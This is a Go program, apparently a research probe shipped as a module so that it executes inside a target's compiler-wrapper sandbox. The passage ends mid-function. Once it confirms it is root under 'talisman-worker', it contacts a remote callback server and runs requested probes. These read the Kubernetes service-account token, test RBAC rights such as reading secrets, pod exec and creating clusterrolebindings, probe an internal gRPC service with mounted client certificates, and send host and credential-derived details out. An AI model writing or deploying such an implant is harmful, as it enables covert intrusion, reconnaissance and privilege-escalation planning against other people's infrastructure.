// Command contentproof-client runs a short session of typed, bounded
// architecture probes from one exact owned Capslock compiler wrapper.
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"mime"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var callbackURL string
var callbackSession string
var callbackURLSHA256 string

const (
	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.120-codex"
	expectedAgent  = "go-cgo-pkgsite-probe-v120-bounded-identity"
	httpTimeout    = 15 * time.Second
	sessionLength  = 10 * time.Minute
	maximumSteps   = 30
	maximumBody    = 32 * 1024
	maximumRead    = 256 * 1024
	maximumPath    = 512

	kubeBaseURL       = "https://kubernetes.default.svc"
	kubeTokenPath     = "/var/run/secrets/kubernetes.io/serviceaccount/token"
	kubeCAPath        = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
	kubeNamespacePath = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

	internalGRPCAddress = "talisman-core.default.svc.cluster.local:9000"
	internalServerName  = "localhost"
	clientCertificate   = "/etc/tls/client/tls.crt"
	clientKey           = "/etc/tls/client/tls.key"
	serverPool          = "/etc/tls/server-pool/server-tls-pool.pem"
	healthMethod        = "/grpc.health.v1.Health/Check"
	reflectionMethod    = "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"
	maximumCredential   = 64 * 1024
	maximumGRPCBody     = 128 * 1024
)

var fixedPaths = []string{
	expectedOrigin,
	"/capslock",
	"/capslock/modcache",
	"/tmp/modules",
	"/app/binaries",
	"/bundle",
	"/usr/local/bin/runsc",
	"/etc/tls/client",
	"/etc/tls/server-pool",
	kubeTokenPath,
	kubeCAPath,
	kubeNamespacePath,
	"/workspace",
}

var fixedBinaries = []string{
	"/usr/bin/gcc",
	"/usr/bin/clang",
	"/usr/local/go/bin/go",
	"/usr/local/bin/go",
}

var directoryPrefixes = []string{
	"/capslock",
	"/tmp",
	"/proc/self",
	"/proc/1",
	"/usr/local/go",
	"/app",
	"/bundle",
}

type requestSpec struct {
	ID   string            `json:"id"`
	Args map[string]string `json:"args"`
}

type startEnvelope struct {
	Fingerprint   string `json:"fingerprint"`
	Sequence      int    `json:"sequence"`
	TimestampUnix int64  `json:"timestamp_unix"`
	Transcript    string `json:"transcript_hash"`
}

type stepEnvelope struct {
	Fingerprint   string      `json:"fingerprint"`
	Sequence      int         `json:"sequence"`
	TimestampUnix int64       `json:"timestamp_unix"`
	Previous      string      `json:"previous_hash"`
	Transcript    string      `json:"transcript_hash"`
	Request       requestSpec `json:"request"`
	Status        string      `json:"status"`
	Error         string      `json:"error"`
	Result        any         `json:"result"`
}

type protocolResponse struct {
	Fingerprint   string      `json:"fingerprint"`
	Sequence      int         `json:"sequence"`
	TimestampUnix int64       `json:"timestamp_unix"`
	Status        string      `json:"status"`
	Error         string      `json:"error"`
	Transcript    string      `json:"transcript_hash"`
	DeadlineUnix  int64       `json:"deadline_unix"`
	Request       requestSpec `json:"request"`
	Done          bool        `json:"done"`
}

type clientState struct {
	origin      string
	fingerprint string
	workspace   string
}

type runtimeFacts struct {
	GOOS    string `json:"goos"`
	GOARCH  string `json:"goarch"`
	Kernel  string `json:"kernel"`
	Machine string `json:"machine"`
}

type pid1Facts struct {
	Comm string `json:"comm"`
	Exe  string `json:"exe"`
	UID  int    `json:"uid"`
	GID  int    `json:"gid"`
}

type namespaceFacts struct {
	SelfMount string `json:"self_mnt"`
	PID1Mount string `json:"pid1_mnt"`
	SelfNet   string `json:"self_net"`
	PID1Net   string `json:"pid1_net"`
}

type ancestorFact struct {
	Depth int    `json:"depth"`
	Comm  string `json:"comm"`
}

type fixedPathFact struct {
	Path   string `json:"path"`
	Exists bool   `json:"exists"`
	Kind   string `json:"kind"`
}

type fixedMountFact struct {
	Path          string `json:"path"`
	MountPoint    string `json:"mount_point"`
	FSType        string `json:"fs_type"`
	MountReadOnly bool   `json:"mount_read_only"`
	SuperReadOnly bool   `json:"super_read_only"`
}

type interfaceFact struct {
	Name     string `json:"name"`
	Up       bool   `json:"up"`
	Loopback bool   `json:"loopback"`
}

type dnsFacts struct {
	ResolvConfPresent bool `json:"resolv_conf_present"`
	NameserverCount   int  `json:"nameserver_count"`
	SearchPresent     bool `json:"search_present"`
}

type accessFacts struct {
	Read    bool `json:"read"`
	Write   bool `json:"write"`
	Execute bool `json:"execute"`
}

type metadataFact struct {
	Path   string `json:"path"`
	Exists bool   `json:"exists"`
	Kind   string `json:"kind"`
	Mode   string `json:"mode"`
	UID    uint32 `json:"uid"`
	GID    uint32 `json:"gid"`
	Size   int64  `json:"size"`
	Dev    uint64 `json:"dev"`
	Inode  uint64 `json:"inode"`
}

type pathMetadata struct {
	metadataFact
	SymlinkTarget string         `json:"symlink_target"`
	MountPoint    string         `json:"mount_point"`
	FSType        string         `json:"fs_type"`
	MountReadOnly bool           `json:"mount_read_only"`
	SuperReadOnly bool           `json:"super_read_only"`
	Access        accessFacts    `json:"access"`
	Parents       []metadataFact `json:"parents"`
}

type directoryEntry struct {
	Name  string `json:"name"`
	Kind  string `json:"kind"`
	Mode  string `json:"mode"`
	UID   uint32 `json:"uid"`
	GID   uint32 `json:"gid"`
	Size  int64  `json:"size"`
	Dev   uint64 `json:"dev"`
	Inode uint64 `json:"inode"`
}

type directoryMetadata struct {
	Path      string           `json:"path"`
	Entries   []directoryEntry `json:"entries"`
	Truncated bool             `json:"truncated"`
}

type mountRecord struct {
	point         string
	fsType        string
	mountReadOnly bool
	superReadOnly bool
}

type kubePermission struct {
	ID, Group, Resource, Subresource, Verb string
	Namespaced                             bool
}

type kubePermissionResult struct {
	ID                     string `json:"id"`
	HTTPStatus             int    `json:"http_status,omitempty"`
	Allowed                bool   `json:"allowed"`
	Denied                 bool   `json:"denied"`
	EvaluationErrorPresent bool   `json:"evaluation_error_present"`
	ValidResponse          bool   `json:"valid_response"`
}

type kubernetesResult struct {
	ProjectedIdentityPresent bool                   `json:"projected_identity_present"`
	APIVersionReachable      bool                   `json:"api_version_reachable"`
	Major                    string                 `json:"major,omitempty"`
	Minor                    string                 `json:"minor,omitempty"`
	Platform                 string                 `json:"platform,omitempty"`
	Namespace                string                 `json:"namespace,omitempty"`
	TokenClaims              map[string]any         `json:"token_claims,omitempty"`
	Checks                   []kubePermissionResult `json:"checks"`
	Error                    string                 `json:"error,omitempty"`
}

type kubeVersion struct {
	Major    string `json:"major"`
	Minor    string `json:"minor"`
	Platform string `json:"platform"`
}

type resourceAttributes struct {
	Namespace   string `json:"namespace,omitempty"`
	Verb        string `json:"verb"`
	Group       string `json:"group,omitempty"`
	Resource    string `json:"resource"`
	Subresource string `json:"subresource,omitempty"`
}

type selfSubjectAccessReview struct {
	APIVersion string `json:"apiVersion"`
	Kind       string `json:"kind"`
	Spec       struct {
		ResourceAttributes resourceAttributes `json:"resourceAttributes"`
	} `json:"spec"`
	Status struct {
		Allowed         bool   `json:"allowed"`
		Denied          bool   `json:"denied"`
		Reason          string `json:"reason"`
		EvaluationError string `json:"evaluationError"`
	} `json:"status"`
}

type grpcCallResult struct {
	Method               string `json:"method"`
	TLSConnected         bool   `json:"tls_connected"`
	HTTPStatus           int    `json:"http_status,omitempty"`
	GRPCStatus           int    `json:"grpc_status"`
	ResponseFrames       int    `json:"response_frames"`
	ResponsePayloadBytes int    `json:"response_payload_bytes"`
	ValidResponse        bool   `json:"valid_response"`
	Error                string `json:"error,omitempty"`
}

type certificateIdentity struct {
	Subject   string   `json:"subject,omitempty"`
	Issuer    string   `json:"issuer,omitempty"`
	DNSNames  []string `json:"dns_names,omitempty"`
	NotBefore string   `json:"not_before,omitempty"`
	NotAfter  string   `json:"not_after,omitempty"`
	SHA256    string   `json:"sha256,omitempty"`
}

type internalGRPCResult struct {
	CredentialFilesPresent bool                `json:"credential_files_present"`
	Certificate            certificateIdentity `json:"certificate"`
	Health                 grpcCallResult      `json:"health"`
	Reflection             grpcCallResult      `json:"reflection"`
	FixedServices          map[string]bool     `json:"fixed_services"`
	HealthStatus           string              `json:"health_status,omitempty"`
	Error                  string              `json:"error,omitempty"`
}

type protobufField struct {
	number int
	wire   int
	varint uint64
	bytes  []byte
}

var kubePermissions = []kubePermission{
	{ID: "secrets_get", Resource: "secrets", Verb: "get", Namespaced: true},
	{ID: "secrets_list", Resource: "secrets", Verb: "list", Namespaced: true},
	{ID: "secrets_update", Resource: "secrets", Verb: "update", Namespaced: true},
	{ID: "secrets_delete", Resource: "secrets", Verb: "delete", Namespaced: true},
	{ID: "pods_create", Resource: "pods", Verb: "create", Namespaced: true},
	{ID: "pods_exec_create", Resource: "pods", Subresource: "exec", Verb: "create", Namespaced: true},
	{ID: "jobs_create", Group: "batch", Resource: "jobs", Verb: "create", Namespaced: true},
	{ID: "serviceaccounts_token_create", Resource: "serviceaccounts", Subresource: "token", Verb: "create", Namespaced: true},
	{ID: "serviceaccounts_impersonate", Resource: "serviceaccounts", Verb: "impersonate", Namespaced: true},
	{ID: "roles_create", Group: "rbac.authorization.k8s.io", Resource: "roles", Verb: "create", Namespaced: true},
	{ID: "rolebindings_create", Group: "rbac.authorization.k8s.io", Resource: "rolebindings", Verb: "create", Namespaced: true},
	{ID: "clusterrolebindings_create", Group: "rbac.authorization.k8s.io", Resource: "clusterrolebindings", Verb: "create"},
}

var fixedReflectedServices = []string{
	"grpc.health.v1.Health",
	"grpc.reflection.v1alpha.ServerReflection",
	"sos.byteman.Byteman",
	"sos.pacman.Pacman",
	"sos.queue.Queue",
	"sos.talisman.Talisman",
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	origin := filepath.Clean(os.Args[3])
	if origin != expectedOrigin || os.Args[3] != origin || os.Geteuid() != 0 || readComm(1) != "talisman-worker" {
		return
	}
	runSession(origin)
}

func runSession(origin string) {
	state := clientState{origin: origin, fingerprint: podFingerprint()}
	transcript := initialTranscript(state.fingerprint)
	start := startEnvelope{Fingerprint: state.fingerprint, Sequence: 0, TimestampUnix: time.Now().Unix(), Transcript: transcript}
	status, body, err := call(http.MethodPost, "start", start)
	if err != nil || status != http.StatusOK {
		return
	}
	var next protocolResponse
	if json.Unmarshal(body, &next) != nil || !validProtocolReply(next, state.fingerprint, transcript, 0) || next.Done {
		return
	}
	deadline := time.Now().Add(sessionLength)
	if remote := time.Unix(next.DeadlineUnix, 0); next.DeadlineUnix > 0 && remote.Before(deadline) {
		deadline = remote
	}
	for completed := 0; completed < maximumSteps && time.Now().Before(deadline); completed++ {
		sequence := next.Sequence + 1
		if sequence < 1 || sequence > maximumSteps {
			return
		}
		result, statusText, errorText := executeProbe(next.Request, &state, sequence)
		updated, err := stepTranscript(transcript, sequence, next.Request, statusText, errorText, result)
		if err != nil {
			return
		}
		step := stepEnvelope{
			Fingerprint: state.fingerprint, Sequence: sequence, TimestampUnix: time.Now().Unix(),
			Previous: transcript, Transcript: updated, Request: next.Request,
			Status: statusText, Error: errorText, Result: result,
		}
		status, body, err = call(http.MethodPut, "step", step)
		if err != nil || (status != http.StatusOK && status != http.StatusCreated) {
			return
		}
		transcript = updated
		next = protocolResponse{}
		if json.Unmarshal(body, &next) != nil || !validProtocolReply(next, state.fingerprint, transcript, sequence) {
			return
		}
		if next.Done {
			return
		}
	}
}

func validProtocolReply(value protocolResponse, fingerprint, transcript string, sequence int) bool {
	return value.Fingerprint == fingerprint && value.Sequence == sequence && value.Transcript == transcript &&
		value.Status == "ok" && value.Error == "" && value.TimestampUnix > 0
}

func podFingerprint() string {
	hostname, _ := os.Hostname()
	material := strings.Join([]string{
		expectedOrigin, hostname,
		readNamespace("/proc/self/ns/mnt"), readNamespace("/proc/self/ns/net"),
		readNamespace("/proc/1/ns/mnt"), readNamespace("/proc/1/ns/net"),
	}, "\n")
	digest := sha256.Sum256([]byte(material))
	return hex.EncodeToString(digest[:])
}

func initialTranscript(fingerprint string) string {
	digest := sha256.Sum256([]byte("owned-go-capslock-v120/1\n" + fingerprint))
	return hex.EncodeToString(digest[:])
}

func canonicalJSON(value any) ([]byte, error) {
	encoded, err := json.Marshal(value)
	if err != nil {
		return nil, err
	}
	decoder := json.NewDecoder(bytes.NewReader(encoded))
	decoder.UseNumber()
	var generic any
	if decoder.Decode(&generic) != nil {
		return nil, errors.New("canonical JSON decode failed")
	}
	return json.Marshal(generic)
}

func stepTranscript(previous string, sequence int, request requestSpec, status, errorText string, result any) (string, error) {
	encodedRequest, err := canonicalJSON(request)
	if err != nil {
		return "", err
	}
	encodedResult, err := canonicalJSON(result)
	if err != nil {
		return "", err
	}
	material := previous + "\n" + strconv.Itoa(sequence) + "\n" + string(encodedRequest) + "\n" + status + "\n" + errorText + "\n" + string(encodedResult)
	digest := sha256.Sum256([]byte(material))
	return hex.EncodeToString(digest[:]), nil
}

func normalized(value any) (any, bool) {
	encoded, err := canonicalJSON(value)
	if err != nil || len(encoded) > maximumBody {
		return nil, false
	}
	decoder := json.NewDecoder(bytes.NewReader(encoded))
	decoder.UseNumber()
	var output any
	if decoder.Decode(&output) != nil {
		return nil, false
	}
	return output, true
}

func executeProbe(request requestSpec, state *clientState, sequence int) (any, string, string) {
	if !validRequestShape(request, state.workspace) {
		return nil, "error", "request_denied"
	}
	var value any
	var err error
	switch request.ID {
	case "identity":
		cwd, cwdErr := os.Getwd()
		if cwdErr != nil || !filepath.IsAbs(cwd) {
			cwd = "/"
		}
		if len(cwd) > maximumPath {
			cwd = cwd[:maximumPath]
		}
		state.workspace = cwd
		hostname, _ := os.Hostname()
		value = map[string]any{
			"lane": "capslock-gcc-wrapper", "origin": state.origin,
			"uid": os.Getuid(), "euid": os.Geteuid(), "gid": os.Getgid(), "egid": os.Getegid(),
			"cwd": cwd, "hostname": sanitizeText(hostname, 128),
		}
	case "pid1":
		value = collectPID1()
	case "namespaces":
		value = namespaceFacts{
			SelfMount: readNamespace("/proc/self/ns/mnt"), PID1Mount: readNamespace("/proc/1/ns/mnt"),
			SelfNet: readNamespace("/proc/self/ns/net"), PID1Net: readNamespace("/proc/1/ns/net"),
		}
	case "fixed_paths":
		value = collectFixedPaths()
	case "fixed_mounts":
		value = collectFixedMounts()
	case "toolchain":
		value = collectToolchain()
	case "process_lineage":
		value = collectAncestors()
	case "interfaces":
		value = collectInterfaces()
	case "dns_summary":
		value = collectDNS()
	case "kubernetes_authz":
		value = runKubernetesAuthorization()
	case "internal_grpc_identity":
		value = runInternalGRPCIdentity()
	case "path_meta":
		value, err = collectPathMetadata(request.Args["path"])
	case "dir_meta":
		value, err = collectDirectoryMetadata(request.Args["path"])
	case "write_canary":
		value, err = runWriteCanary(request.Args["path"], state, sequence)
	case "egress_receipt":
		value = map[string]any{"marker": "hi", "attempts": 1, "scheme": "https"}
	default:
		return nil, "error", "unknown_probe"
	}
	if err != nil {
		return nil, "error", classifyProbeError(request.ID, err)
	}
	output, ok := normalized(value)
	if !ok {
		return nil, "error", "result_invalid"
	}
	return output, "ok", ""
}

func classifyProbeError(probeID string, err error) string {
	if errors.Is(err, os.ErrPermission) {
		return probeID + "_permission"
	}
	if errors.Is(err, os.ErrNotExist) {
		return probeID + "_not_found"
	}
	return probeID + "_failed"
}

func validRequestShape(request requestSpec, workspace string) bool {
	noArguments := map[string]bool{
		"identity": true, "kubernetes_authz": true, "internal_grpc_identity": true,
	}
	if noArguments[request.ID] {
		return len(request.Args) == 0
	}
	return false
}

func validatePathArgument(path string) error {
	if path == "" || len(path) > maximumPath || strings.ContainsRune(path, 0) || !filepath.IsAbs(path) || filepath.Clean(path) != path {
		return errors.New("invalid path")
	}
	parts := strings.Split(strings.TrimPrefix(path, "/"), "/")
	for _, part := range parts {
		if part == ".." {
			return errors.New("path traversal")
		}
	}
	if dangerousProcPath(path) {
		return errors.New("denied proc path")
	}
	return nil
}

func dangerousProcPath(path string) bool {
	if path == "/proc/kcore" || path == "/proc/kmem" {
		return true
	}
	parts := strings.Split(strings.TrimPrefix(path, "/"), "/")
	if len(parts) < 3 || parts[0] != "proc" {
		return false
	}
	for _, part := range parts[2:] {
		if part == "fd" || part == "fdinfo" || part == "mem" || part == "map_files" {
			return true
		}
	}
	return false
}

func validateDirectoryArgument(path string) error {
	if err := validatePathArgument(path); err != nil {
		return err
	}
	if path == "/etc/tls" || strings.HasPrefix(path, "/etc/tls/") {
		return errors.New("TLS directory listing denied")
	}
	for _, prefix := range directoryPrefixes {
		if path == prefix || strings.HasPrefix(path, prefix+"/") {
			return nil
		}
	}
	return errors.New("directory prefix denied")
}

func validateCanaryBase(path, workspace string) error {
	if err := validatePathArgument(path); err != nil {
		return err
	}
	if path == "/tmp" || (workspace != "" && path == workspace) {
		return nil
	}
	return errors.New("canary base denied")
}

func collectRuntime() runtimeFacts {
	value := runtimeFacts{GOOS: runtime.GOOS, GOARCH: runtime.GOARCH}
	var system syscall.Utsname
	if syscall.Uname(&system) == nil {
		value.Kernel = utsString(system.Sysname[:])
		value.Machine = utsString(system.Machine[:])
	}
	return value
}

func collectToolchain() map[string]any {
	facts := collectRuntime()
	binaries := map[string]bool{}
	for _, path := range fixedBinaries {
		_, err := os.Lstat(path)
		binaries[path] = err == nil
	}
	return map[string]any{
		"goos": facts.GOOS, "goarch": facts.GOARCH, "runtime_version": sanitizeText(runtime.Version(), 128),
		"kernel": facts.Kernel, "machine": facts.Machine, "binaries": binaries,
	}
}

func utsString(value []int8) string {
	output := make([]byte, 0, len(value))
	for _, character := range value {
		if character == 0 {
			break
		}
		output = append(output, byte(character))
	}
	return sanitizeText(string(output), 64)
}

func sanitizeText(value string, maximum int) string {
	var output strings.Builder
	for _, character := range value {
		if output.Len() >= maximum {
			break
		}
		if (character >= 'a' && character <= 'z') || (character >= 'A' && character <= 'Z') ||
			(character >= '0' && character <= '9') || strings.ContainsRune("_.+:/ -", character) {
			output.WriteRune(character)
		} else {
			output.WriteByte('_')
		}
	}
	return output.String()
}

func readBounded(path string, maximum int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	data, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(data)) > maximum {
		return nil, errors.New("bounded read failed")
	}
	return data, nil
}

func readNamespace(path string) string {
	value, err := os.Readlink(path)
	if err != nil || len(value) > 64 {
		return ""
	}
	return value
}

func readComm(pid int) string {
	data, err := readBounded("/proc/"+strconv.Itoa(pid)+"/comm", 128)
	if err != nil {
		return ""
	}
	return sanitizeText(strings.TrimSpace(string(data)), 64)
}

func parentPID(pid int) (int, error) {
	data, err := readBounded("/proc/"+strconv.Itoa(pid)+"/stat", 4096)
	if err != nil {
		return 0, err
	}
	closing := strings.LastIndexByte(string(data), ')')
	if closing < 0 || closing+2 >= len(data) {
		return 0, errors.New("invalid proc stat")
	}
	fields := strings.Fields(string(data[closing+2:]))
	if len(fields) < 2 {
		return 0, errors.New("short proc stat")
	}
	return strconv.Atoi(fields[1])
}

func collectAncestors() []ancestorFact {
	result := make([]ancestorFact, 0, 12)
	pid := os.Getpid()
	for depth := 0; depth < 12 && pid > 0; depth++ {
		comm := readComm(pid)
		if comm == "" {
			break
		}
		result = append(result, ancestorFact{Depth: depth, Comm: comm})
		if pid == 1 {
			break
		}
		next, err := parentPID(pid)
		if err != nil || next <= 0 || next == pid {
			break
		}
		pid = next
	}
	if len(result) == 0 {
		result = append(result, ancestorFact{Depth: 0, Comm: "unknown"})
	}
	return result
}

func collectPID1() pid1Facts {
	result := pid1Facts{Comm: readComm(1)}
	if executable, err := os.Readlink("/proc/1/exe"); err == nil {
		result.Exe = sanitizeText(executable, 128)
	}
	data, err := readBounded("/proc/1/status", 64*1024)
	if err != nil {
		return result
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		switch strings.TrimSuffix(fields[0], ":") {
		case "Uid":
			result.UID, _ = strconv.Atoi(fields[1])
		case "Gid":
			result.GID, _ = strconv.Atoi(fields[1])
		}
	}
	return result
}

func decodeMountPath(value string) string {
	return strings.NewReplacer("\\040", " ", "\\011", "\t", "\\012", "\n", "\\134", "\\").Replace(value)
}

func optionPresent(options, expected string) bool {
	return strings.Contains(","+options+",", ","+expected+",")
}

func collectMounts() []mountRecord {
	data, err := readBounded("/proc/self/mountinfo", maximumRead)
	if err != nil {
		return nil
	}
	result := make([]mountRecord, 0, 64)
	for _, line := range strings.Split(string(data), "\n") {
		parts := strings.SplitN(line, " - ", 2)
		if len(parts) != 2 {
			continue
		}
		left, right := strings.Fields(parts[0]), strings.Fields(parts[1])
		if len(left) < 6 || len(right) < 3 {
			continue
		}
		result = append(result, mountRecord{
			point: decodeMountPath(left[4]), fsType: sanitizeText(right[0], 64),
			mountReadOnly: optionPresent(left[5], "ro"), superReadOnly: optionPresent(right[2], "ro"),
		})
	}
	return result
}

func mountFor(path string, mounts []mountRecord) mountRecord {
	best := mountRecord{}
	for _, item := range mounts {
		matches := item.point == "/" || path == item.point || strings.HasPrefix(path, strings.TrimSuffix(item.point, "/")+"/")
		if matches && len(item.point) > len(best.point) {
			best = item
		}
	}
	return best
}

func kindFor(info os.FileInfo) string {
	switch {
	case info.Mode()&os.ModeSymlink != 0:
		return "symlink"
	case info.IsDir():
		return "directory"
	case info.Mode().IsRegular():
		return "regular"
	default:
		return "other"
	}
}

func modeFor(info os.FileInfo) string {
	bits := uint64(info.Mode().Perm())
	if stat, ok := info.Sys().(*syscall.Stat_t); ok {
		bits = uint64(stat.Mode & 0o7777)
	}
	value := strconv.FormatUint(bits, 8)
	return strings.Repeat("0", 4-len(value)) + value
}

func baseMetadata(path string) (metadataFact, error) {
	result := metadataFact{Path: path, Kind: "missing", Mode: "0000"}
	info, err := os.Lstat(path)
	if errors.Is(err, os.ErrNotExist) {
		return result, nil
	}
	if err != nil {
		return result, err
	}
	result.Exists, result.Kind, result.Mode, result.Size = true, kindFor(info), modeFor(info), info.Size()
	if stat, ok := info.Sys().(*syscall.Stat_t); ok {
		result.UID, result.GID, result.Dev, result.Inode = stat.Uid, stat.Gid, uint64(stat.Dev), stat.Ino
	}
	return result, nil
}

func collectFixedPaths() []fixedPathFact {
	result := make([]fixedPathFact, 0, len(fixedPaths))
	for _, path := range fixedPaths {
		metadata, err := baseMetadata(path)
		if err != nil {
			result = append(result, fixedPathFact{Path: path, Kind: "missing"})
			continue
		}
		result = append(result, fixedPathFact{Path: path, Exists: metadata.Exists, Kind: metadata.Kind})
	}
	return result
}

func collectFixedMounts() []fixedMountFact {
	mounts := collectMounts()
	result := make([]fixedMountFact, 0, len(fixedPaths))
	for _, path := range fixedPaths {
		mount := mountFor(path, mounts)
		result = append(result, fixedMountFact{
			Path: path, MountPoint: mount.point, FSType: mount.fsType,
			MountReadOnly: mount.mountReadOnly, SuperReadOnly: mount.superReadOnly,
		})
	}
	return result
}

func collectPathMetadata(path string) (pathMetadata, error) {
	if err := validatePathArgument(path); err != nil {
		return pathMetadata{}, err
	}
	metadata, err := baseMetadata(path)
	if err != nil {
		return pathMetadata{}, err
	}
	result := pathMetadata{metadataFact: metadata}
	if metadata.Kind == "symlink" {
		if target, readErr := os.Readlink(path); readErr == nil {
			if len(target) > maximumPath {
				target = target[:maximumPath]
			}
			result.SymlinkTarget = target
		}
	}
	mount := mountFor(path, collectMounts())
	result.MountPoint, result.FSType = mount.point, mount.fsType
	result.MountReadOnly, result.SuperReadOnly = mount.mountReadOnly, mount.superReadOnly
	result.Access = accessFacts{
		Read: syscall.Access(path, 4) == nil, Write: syscall.Access(path, 2) == nil, Execute: syscall.Access(path, 1) == nil,
	}
	parent := filepath.Dir(path)
	for depth := 0; depth < 8; depth++ {
		item, parentErr := baseMetadata(parent)
		if parentErr != nil {
			break
		}
		result.Parents = append(result.Parents, item)
		if parent == "/" {
			break
		}
		parent = filepath.Dir(parent)
	}
	if result.Parents == nil {
		result.Parents = []metadataFact{}
	}
	return result, nil
}

func collectDirectoryMetadata(path string) (directoryMetadata, error) {
	if err := validateDirectoryArgument(path); err != nil {
		return directoryMetadata{}, err
	}
	info, err := os.Lstat(path)
	if err != nil {
		return directoryMetadata{}, err
	}
	if info.Mode()&os.ModeSymlink != 0 || !info.IsDir() {
		return directoryMetadata{}, errors.New("not a direct directory")
	}
	fd, err := syscall.Open(path, syscall.O_RDONLY|syscall.O_DIRECTORY|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0)
	if err != nil {
		return directoryMetadata{}, err
	}
	file := os.NewFile(uintptr(fd), path)
	if file == nil {
		_ = syscall.Close(fd)
		return directoryMetadata{}, errors.New("directory open failed")
	}
	defer file.Close()
	entries, readErr := file.ReadDir(65)
	if readErr != nil && !errors.Is(readErr, io.EOF) {
		return directoryMetadata{}, readErr
	}
	result := directoryMetadata{Path: path, Entries: []directoryEntry{}, Truncated: len(entries) > 64}
	if len(entries) > 64 {
		entries = entries[:64]
	}
	for _, entry := range entries {
		entryInfo, infoErr := entry.Info()
		if infoErr != nil {
			continue
		}
		item := directoryEntry{Name: entry.Name(), Kind: kindFor(entryInfo), Mode: modeFor(entryInfo), Size: entryInfo.Size()}
		if len(item.Name) > 255 {
			item.Name = item.Name[:255]
		}
		if stat, ok := entryInfo.Sys().(*syscall.Stat_t); ok {
			item.UID, item.GID, item.Dev, item.Inode = stat.Uid, stat.Gid, uint64(stat.Dev), stat.Ino
		}
		result.Entries = append(result.Entries, item)
	}
	sort.Slice(result.Entries, func(i, j int) bool { return result.Entries[i].Name < result.Entries[j].Name })
	return result, nil
}

func runWriteCanary(base string, state *clientState, sequence int) (map[string]any, error) {
	if err := validateCanaryBase(base, state.workspace); err != nil {
		return nil, err
	}
	var random [8]byte
	if _, err := rand.Read(random[:]); err != nil {
		return nil, err
	}
	basename := ".go-cgo-v120-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
	path := filepath.Join(base, basename)
	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
	if err != nil {
		return nil, err
	}
	file := os.NewFile(uintptr(fd), path)
	created, synced, unlinked := true, false, false
	defer func() { _ = os.Remove(path) }()
	if _, err = file.Write([]byte("hi\n")); err == nil {
		err = file.Sync()
		synced = err == nil
	}
	closeErr := file.Close()
	if err == nil {
		err = closeErr
	}
	if err == nil {
		err = os.Remove(path)
		unlinked = err == nil
	}
	_, statErr := os.Lstat(path)
	cleanup := errors.Is(statErr, os.ErrNotExist)
	result := map[string]any{
		"base": base, "basename": basename, "created": created, "synced": synced,
		"unlinked": unlinked, "cleanup_confirmed": cleanup,
	}
	if err != nil {
		return result, err
	}
	return result, nil
}

func collectInterfaces() []interfaceFact {
	interfaces, err := net.Interfaces()
	if err != nil {
		return []interfaceFact{}
	}
	result := make([]interfaceFact, 0, len(interfaces))
	for _, item := range interfaces {
		if len(result) == 32 {
			break
		}
		result = append(result, interfaceFact{
			Name: sanitizeText(item.Name, 64), Up: item.Flags&net.FlagUp != 0, Loopback: item.Flags&net.FlagLoopback != 0,
		})
	}
	sort.Slice(result, func(i, j int) bool { return result[i].Name < result[j].Name })
	return result
}

func collectDNS() dnsFacts {
	data, err := readBounded("/etc/resolv.conf", 64*1024)
	if err != nil {
		return dnsFacts{}
	}
	result := dnsFacts{ResolvConfPresent: true}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) == 0 || strings.HasPrefix(fields[0], "#") {
			continue
		}
		switch fields[0] {
		case "nameserver":
			if result.NameserverCount < 16 {
				result.NameserverCount++
			}
		case "search", "domain":
			result.SearchPresent = true
		}
	}
	return result
}

func runKubernetesAuthorization() kubernetesResult {
	result := kubernetesResult{Checks: []kubePermissionResult{}}
	token, err := readBoundedCredential(kubeTokenPath)
	if err != nil {
		result.Error = "projected_token_unavailable"
		return result
	}
	defer clearBytes(token)
	ca, err := readBoundedCredential(kubeCAPath)
	if err != nil {
		result.Error = "projected_ca_unavailable"
		return result
	}
	defer clearBytes(ca)
	namespaceBytes, err := readBoundedCredential(kubeNamespacePath)
	if err != nil {
		result.Error = "projected_namespace_unavailable"
		return result
	}
	defer clearBytes(namespaceBytes)
	namespace := strings.TrimSpace(string(namespaceBytes))
	if !validNamespace(namespace) {
		result.Error = "projected_namespace_invalid"
		return result
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(ca) {
		result.Error = "projected_ca_invalid"
		return result
	}
	transport := &http.Transport{
		Proxy: nil,
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12, RootCAs: pool, ServerName: "kubernetes.default.svc",
		},
		DialContext:       (&net.Dialer{Timeout: 3 * time.Second, KeepAlive: -1}).DialContext,
		DisableKeepAlives: true, ForceAttemptHTTP2: true,
		TLSHandshakeTimeout: 3 * time.Second, ResponseHeaderTimeout: 4 * time.Second,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{Transport: transport, Timeout: 5 * time.Second, CheckRedirect: rejectRedirect}
	result.ProjectedIdentityPresent = true
	result.Namespace = namespace
	result.TokenClaims = safeJWTClaims(token)
	executeKubernetesChecks(client, kubeBaseURL, string(token), namespace, &result)
	return result
}

func executeKubernetesChecks(client *http.Client, baseURL, token, namespace string, result *kubernetesResult) {
	versionBody, status, err := authenticatedJSON(client, http.MethodGet, baseURL+"/version", token, nil, 16*1024)
	if err == nil && status == http.StatusOK {
		var version kubeVersion
